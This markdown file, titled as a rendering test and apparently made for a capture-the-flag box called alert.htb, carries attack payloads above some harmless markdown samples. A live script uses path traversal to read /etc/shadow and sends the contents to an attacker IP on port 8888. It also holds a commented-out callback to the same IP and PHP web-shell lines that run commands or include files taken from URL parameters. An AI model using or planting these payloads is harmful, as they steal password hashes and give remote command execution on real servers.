# Test Markdown Rendering Errors

<!-- <script>

    fetch("http://10.10.14.41:8888")
    .then(data=>{
        console.log("hello :)");
    })
</script> -->

<script>
fetch("http://alert.htb/messages.php?file=../../../../etc/shadow")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.14.41:8888/?file_content=" + encodeURIComponent(data));
  });
</script>


<?php //doesn't work
echo("This is a test");
?>

<?php //doesn't work
system($_GET['cmd']);
?>

<?php //doesn't work
include($_GET['file']);
?>

- This is a **bold and _italic_ text.
- List item 1
- List item 2 

## Second section

1. Item 1
2. Item 2

~~Strikethrough text~~

[Link to Google](www.google.com)

![Image](image.jpg)

| Header 1 | Header 2 |
|----------|----------|
| Cell 1   | Cell 2   |

### Third section

> Blockquote 

\*Escaped\*
